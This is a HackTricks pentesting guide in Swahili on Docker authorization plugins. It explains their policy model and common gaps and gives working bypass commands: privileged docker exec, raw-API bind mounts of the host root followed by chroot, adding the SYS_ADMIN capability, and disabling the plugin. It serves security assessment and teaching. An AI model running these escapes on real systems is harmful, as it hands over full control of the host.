# Plugins za Authorization ya Runtime

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Plugins za authorization ya runtime ni safu ya ziada ya sera inayoamua ikiwa caller anaweza kutekeleza action fulani ya daemon. Docker ni mfano wa kawaida. Kwa default, mtu yeyote anayeweza kuwasiliana na Docker daemon huwa na control pana juu yake. Authorization plugins hujaribu kupunguza modeli hiyo kwa kuchunguza utambulisho wa user aliyethibitishwa na operation ya API iliyoombwa, kisha kuruhusu au kukataa request kulingana na policy.

Mada hii inahitaji ukurasa wake kwa sababu hubadilisha exploitation model wakati attacker tayari ana access kwenye Docker API au kwa user aliye katika `docker` group. Katika mazingira kama haya, swali si tena "naweza kufikia daemon?" pekee, bali pia "je, daemon imewekewa authorization layer, na ikiwa ndivyo, je, layer hiyo inaweza kubypass kupitia endpoints ambazo hazijashughulikiwa, JSON parsing dhaifu, au permissions za plugin-management?"

## Uendeshaji

Request inapofika kwenye Docker daemon, authorization subsystem inaweza kupitisha request context kwa plugin moja au zaidi zilizoinstalliwa. Plugin huona utambulisho wa user aliyethibitishwa, maelezo ya request, headers zilizochaguliwa, na sehemu za request au response body wakati content type inafaa. Plugins nyingi zinaweza kuunganishwa, na access hutolewa tu ikiwa plugins zote zinaruhusu request.

Modeli hii inaonekana kuwa imara, lakini usalama wake unategemea kabisa jinsi policy author alivyoielewa API kwa ukamilifu. Plugin inayozuia `docker run --privileged` lakini ikapuuza `docker exec`, ikakosa JSON keys mbadala kama `Binds` ya kiwango cha juu, au ikaruhusu plugin administration inaweza kuunda hisia ya uzuiaji wa uongo huku ikiwa bado inaacha privilege-escalation paths za moja kwa moja zikiwa wazi.

## Maeneo ya Kawaida ya Kulenga Plugins

Maeneo muhimu ya kupitia kwenye policy ni:

- container creation endpoints
- fields za `HostConfig` kama vile `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, na namespace-sharing options
- tabia ya `docker exec`
- plugin management endpoints
- endpoint yoyote inayoweza kuanzisha runtime actions kwa njia isiyo ya moja kwa moja nje ya policy model iliyokusudiwa

Kihistoria, mifano kama plugin ya Twistlock ya `authz` na plugins rahisi za kielimu kama `authobot` ilifanya modeli hii iwe rahisi kusoma kwa sababu policy files na code paths zake zilionyesha jinsi endpoint-to-action mapping ilivyotekelezwa kwa kweli. Kwa kazi za assessment, somo muhimu ni kwamba policy author lazima aelewe API surface yote badala ya kuangalia CLI commands zinazoonekana zaidi pekee.

## Matumizi Mabaya

Lengo la kwanza ni kujua ni nini hasa kimezuiwa. Ikiwa daemon inakataa action, error mara nyingi huleak jina la plugin, jambo linalosaidia kutambua control inayotumika:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Ikiwa unahitaji endpoint profiling pana zaidi, tools kama `docker_auth_profiler` zinafaa kwa sababu zina-automate kazi inayojirudia ya kukagua ni API routes na miundo ya JSON ipi inaruhusiwa na plugin.

Ikiwa mazingira yanatumia plugin maalum na unaweza kuwasiliana na API, orodhesha ni object fields zipi zinazochujwa:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Ukaguzi huu ni muhimu kwa sababu authorization failures nyingi huhusisha field maalum badala ya concept nzima. Plugin inaweza kukataa muundo wa CLI bila kuzuia kikamilifu muundo sawa wa API.

### Mfano Kamili: `docker exec` Huongeza Privilege Baada ya Kuundwa kwa Container

Policy inayozuia uundaji wa container yenye privileged lakini inaruhusu uundaji wa container isiyo na vizuizi pamoja na `docker exec` bado inaweza kupitwa:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Ikiwa daemon inakubali hatua ya pili, mtumiaji amepata tena process shirikishi yenye privileges ndani ya container ambayo mwandishi wa policy aliamini kuwa imewekewa vikwazo.

### Mfano Kamili: Bind Mount Kupitia Raw API

Baadhi ya policies zilizovunjika hukagua umbo moja tu la JSON. Ikiwa root filesystem bind mount haijazuiwa kwa uthabiti, host bado inaweza ku-mountiwa:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Wazo hilo hilo linaweza pia kuonekana chini ya `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Athari ni kutoroka kabisa kwenye mfumo wa faili wa host. Jambo la kuvutia ni kwamba bypass hii inatokana na policy coverage isiyokamilika, badala ya hitilafu ya kernel.

### Mfano Kamili: Attribute ya Capability Isiyokaguliwa

Ikiwa policy itasahau kuchuja attribute inayohusiana na capability, attacker anaweza kuunda container inayopata tena capability hatari:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Mara `CAP_SYS_ADMIN` au capability yenye nguvu sawa inapopatikana, mbinu nyingi za breakout zilizoelezwa katika [capabilities.md](protections/capabilities.md) na [privileged-containers.md](privileged-containers.md) huwa zinaweza kufikiwa.

### Mfano Kamili: Kuzima Plugin

Ikiwa operations za usimamizi wa plugin zimeruhusiwa, bypass iliyo safi zaidi inaweza kuwa kuzima kabisa udhibiti huo:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Hili ni hitilafu ya policy katika kiwango cha control-plane. Tabaka la authorization lipo, lakini mtumiaji ambaye lilipaswa kumzuia bado ana ruhusa ya kulizima.

## Ukaguzi

Amri hizi zinalenga kubaini ikiwa tabaka la policy lipo na ikiwa linaonekana kuwa kamili au la juu juu.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Kinachovutia hapa:

- Ujumbe wa kukataliwa unaojumuisha jina la plugin unathibitisha kuwepo kwa authorization layer na mara nyingi hufichua implementation halisi.
- Orodha ya plugin inayoonekana kwa attacker inaweza kutosha kubaini ikiwa operesheni za disable au reconfigure zinawezekana.
- Policy inayozuia tu vitendo vya wazi vya CLI lakini haizuii raw API requests inapaswa kuchukuliwa kuwa inaweza kubypass hadi ithibitishwe vinginevyo.

## Runtime Defaults

| Runtime / platform | Hali ya default | Tabia ya default | Udhaifu wa kawaida unaofanywa manually |
| --- | --- | --- | --- |
| Docker Engine | Haijawezeshwa kwa default | Daemon access kwa ufanisi ni all-or-nothing isipokuwa authorization plugin iwe imesanidiwa | plugin policy isiyokamilika, blacklists badala ya allowlists, kuruhusu plugin management, mapungufu ya field-level |
| Podman | Si equivalent ya kawaida ya moja kwa moja | Podman kwa kawaida hutegemea zaidi Unix permissions, rootless execution, na maamuzi ya API exposure kuliko Docker-style authz plugins | kufichua rootful Podman API kwa upana, socket permissions dhaifu |
| containerd / CRI-O | Control model tofauti | Runtime hizi kwa kawaida hutegemea socket permissions, node trust boundaries, na vidhibiti vya orchestrator vya higher-layer badala ya Docker authz plugins | kumount socket ndani ya workloads, dhana dhaifu za node-local trust |
| Kubernetes | Hutumia authn/authz katika layers za API-server na kubelet, si Docker authz plugins | Cluster RBAC na admission controls ndizo policy layer kuu | RBAC iliyo pana kupita kiasi, admission policy dhaifu, kufichua kubelet au runtime APIs moja kwa moja |

{{#include ../../../banners/hacktricks-training.md}}
